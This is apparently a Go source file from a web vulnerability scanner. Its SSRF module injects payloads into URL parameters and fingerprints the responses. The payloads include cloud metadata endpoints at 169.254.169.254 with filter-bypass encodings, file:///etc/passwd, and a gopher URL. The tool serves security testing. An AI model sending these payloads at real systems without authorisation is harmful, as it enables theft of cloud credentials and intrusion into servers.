package ssrf

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"path"
	"strings"
	"sync"

	"github.com/areksaxyz/bhyakugan/internal/core"
	"github.com/areksaxyz/bhyakugan/internal/payloadrepo"
	"github.com/areksaxyz/bhyakugan/internal/utils"
)

type SSRFPayload struct {
	Name     string
	Payload  string
	Detector string
}

var metadataDetectors = map[string]bool{
	"aws_meta":    true,
	"azure_meta":  true,
	"do_meta":     true,
	"oracle_meta": true,
}

var SSRFParams = []string{
	"url", "u", "next", "path", "dest", "destination", "redirect", "uri",
	"callback", "checkout", "feed", "download", "document", "folder",
	"root", "inc", "include", "require", "api", "rest", "source", "src",
	"data", "base", "file", "page", "template", "layout", "view", "dir",
	"action", "command", "exec", "query", "q", "search", "s",
}

var ssrfStaticExtensions = map[string]bool{
	".js": true, ".mjs": true, ".css": true, ".map": true,
	".png": true, ".jpg": true, ".jpeg": true, ".gif": true, ".svg": true, ".ico": true,
	".woff": true, ".woff2": true, ".ttf": true, ".eot": true,
	".mp4": true, ".webm": true, ".mp3": true, ".wav": true,
	".pdf": true, ".zip": true, ".tar": true, ".gz": true,
}

var SSRFPayloads = []SSRFPayload{
	{"SSRF Cloud (AWS/GCP)", "http://169.254.169.254/latest/meta-data/", "aws_meta"},
	{"SSRF Cloud (Azure)", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure_meta"},
	{"SSRF Cloud (DigitalOcean)", "http://169.254.169.254/metadata/v1.json", "do_meta"},
	{"SSRF Cloud (Oracle)", "http://192.0.0.192/1.0/meta-data/", "oracle_meta"},
	{"SSRF Cloud (nip.io bypass)", "http://169.254.169.254.nip.io/latest/meta-data/", "aws_meta"},
	{"SSRF Cloud (Decimal)", "http://2852039166/latest/meta-data/", "aws_meta"},
	{"SSRF Localhost (IPv4)", "http://127.0.0.1:80", "passwd_file"},
	{"SSRF Localhost (Hex)", "http://0x7f000001", "passwd_file"},
	{"SSRF Localhost (CIDR)", "http://127.127.127.127", "passwd_file"},
	{"SSRF File Scheme", "file:///etc/passwd", "passwd_file"},
	{"SSRF Gopher (DNS Leak)", "gopher://127.0.0.1:80/_GET%20/ HTTP/1.1", "passwd_file"},
}

func mergedSSRFParams() []string {
	params := append([]string{}, SSRFParams...)
	seen := make(map[string]bool, len(params))
	for _, param := range params {
		seen[strings.ToLower(param)] = true
	}

	extra := payloadrepo.LoadRepoLines(96,
		"discovery/ssrf-params.txt",
		"ssrf-params.txt",
	)
	for _, raw := range extra {
		param := strings.ToLower(strings.TrimSpace(raw))
		if param == "" || seen[param] {
			continue
		}
		seen[param] = true
		params = append(params, param)
	}
	return params
}

func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if isStaticAssetURL(baseURL) {
		return
	}

	u, _ := url.Parse(baseURL)
	q := u.Query()

	testParams := make(map[string]string)
	if len(q) == 0 {
		if strings.Contains(baseURL, "redirect") || strings.Contains(baseURL, "fetch") || strings.Contains(baseURL, "url") {
			for _, sp := range mergedSSRFParams() {
				testParams[sp] = "1"
			}
		}
	} else {
		for param := range q {
			if !isSSRFSinkParam(param) {
				continue
			}
			testParams[param] = q.Get(param)
		}
	}
	if len(testParams) == 0 {
		return
	}

	baseBody := fetchBodyLower(client, baseURL)
	controlBodies := make(map[string]string, len(testParams))
	for p := range testParams {
		controlTarget, err := buildSSRFURL(baseURL, testParams, p, "http://127.0.0.1.invalid/bhyakugan-ssrf-control")
		if err != nil {
			continue
		}
		controlBodies[p] = fetchBodyLower(client, controlTarget)
	}

	var wg sync.WaitGroup
	sem := make(chan struct{}, 5)

	for targetParam := range testParams {
		for _, payload := range SSRFPayloads {
			wg.Add(1)
			go func(pName string, pay SSRFPayload) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				target, err := buildSSRFURL(baseURL, testParams, pName, pay.Payload)
				if err != nil {
					return
				}

				req, err := http.NewRequest("GET", target, nil)
				if err != nil {
					return
				}
				utils.SetDefaultHeaders(req, target)
				resp, err := client.Do(req)
				if err != nil {
					return
				}
				defer resp.Body.Close()
				// SSRF confirmation heuristics are only meaningful for successful content responses.
				if resp.StatusCode != http.StatusOK {
					return
				}

				bodyBytes, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
				bodyLower := strings.ToLower(string(bodyBytes))

				if !matchesSSRFFingerprint(pay.Detector, bodyLower) {
					return
				}
				// Control checks: avoid reporting if baseline/control already contains same fingerprint.
				if baseBody != "" && matchesSSRFFingerprint(pay.Detector, baseBody) {
					return
				}
				if controlBody := controlBodies[pName]; controlBody != "" && matchesSSRFFingerprint(pay.Detector, controlBody) {
					return
				}

				severity, confidence, detail := classifySSRFFinding(pay)

				onFound(core.Finding{
					Type:       "SSRF Injection",
					Target:     target,
					Detail:     detail,
					Severity:   severity,
					Confidence: confidence,
				})
			}(targetParam, payload)
		}
	}
	wg.Wait()
}

func buildSSRFURL(baseURL string, testParams map[string]string, targetParam, payload string) (string, error) {
	fuzzU, err := url.Parse(baseURL)
	if err != nil {
		return "", err
	}
	fuzzQ := fuzzU.Query()
	for k, v := range testParams {
		fuzzQ.Set(k, v)
	}
	fuzzQ.Set(targetParam, payload)
	fuzzU.RawQuery = fuzzQ.Encode()
	return fuzzU.String(), nil
}

func fetchBodyLower(client *http.Client, target string) string {
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return ""
	}
	utils.SetDefaultHeaders(req, target)
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
	return strings.ToLower(string(body))
}

func matchesSSRFFingerprint(detector, bodyLower string) bool {
	if bodyLower == "" {
		return false
	}
	if detector != "passwd_file" && isLikelyHTML(bodyLower) {
		return false
	}
	switch detector {
	case "aws_meta":
		return countContains(bodyLower, []string{
			"ami-id", "instance-id", "security-credentials", "local-ipv4", "hostname",
		}) >= 3
	case "azure_meta":
		if !strings.Contains(bodyLower, "compute") {
			return false
		}
		return countContains(bodyLower, []string{
			"vmid", "subscriptionid", "resourcegroupname", "osprofile",
		}) >= 2
	case "do_meta":
		if !strings.Contains(bodyLower, "droplet_id") {
			return false
		}
		return countContains(bodyLower, []string{
			"hostname", "interfaces", "region", "floating_ip",
		}) >= 2
	case "oracle_meta":
		// Oracle metadata should expose multiple distinct keys, not just the word "instance".
		return countContains(bodyLower, []string{
			"instance-id", "availability-domain", "compartment-id", "canonical-region-name", "shape", "region",
		}) >= 3
	case "passwd_file":
		return strings.Contains(bodyLower, "root:x:0:0:") &&
			(strings.Contains(bodyLower, "/bin/bash") || strings.Contains(bodyLower, "/bin/sh"))
	default:
		return false
	}
}

func classifySSRFFinding(pay SSRFPayload) (severity string, confidence core.FindingConfidence, detail string) {
	if metadataDetectors[pay.Detector] {
		return "Medium", "probable",
			fmt.Sprintf("%s metadata fingerprint observed (%s). control_validation=true (baseline/control clean), external_callback_validation=false (no DNS/OOB interaction log); treat as medium-confidence signal only until OOB callback or credential exposure is proven.",
				pay.Name, ssrfDetectorLabel(pay.Detector))
	}
	return "High", "confirmed",
		fmt.Sprintf("%s confirmed via metadata/file fingerprint (%s). control_validation=true (baseline/control clean).",
			pay.Name, ssrfDetectorLabel(pay.Detector))
}

func isSSRFSinkParam(param string) bool {
	p := strings.ToLower(strings.TrimSpace(param))
	if p == "" {
		return false
	}
	for _, candidate := range mergedSSRFParams() {
		if p == candidate {
			return true
		}
	}
	if strings.Contains(p, "url") || strings.Contains(p, "uri") || strings.Contains(p, "redirect") || strings.Contains(p, "callback") {
		return true
	}
	return false
}

func isStaticAssetURL(rawURL string) bool {
	u, err := url.Parse(strings.TrimSpace(rawURL))
	if err != nil {
		return false
	}
	ext := strings.ToLower(path.Ext(u.Path))
	if ext == "" {
		return false
	}
	return ssrfStaticExtensions[ext]
}

func isLikelyHTML(bodyLower string) bool {
	return strings.Contains(bodyLower, "<html") ||
		strings.Contains(bodyLower, "<!doctype") ||
		strings.Contains(bodyLower, "<body")
}

func countContains(body string, markers []string) int {
	count := 0
	for _, m := range markers {
		if strings.Contains(body, m) {
			count++
		}
	}
	return count
}

func ssrfDetectorLabel(detector string) string {
	switch detector {
	case "aws_meta":
		return "AWS metadata shape"
	case "azure_meta":
		return "Azure metadata shape"
	case "do_meta":
		return "DigitalOcean metadata shape"
	case "oracle_meta":
		return "Oracle metadata key set"
	case "passwd_file":
		return "/etc/passwd structure"
	default:
		return "generic fingerprint"
	}
}
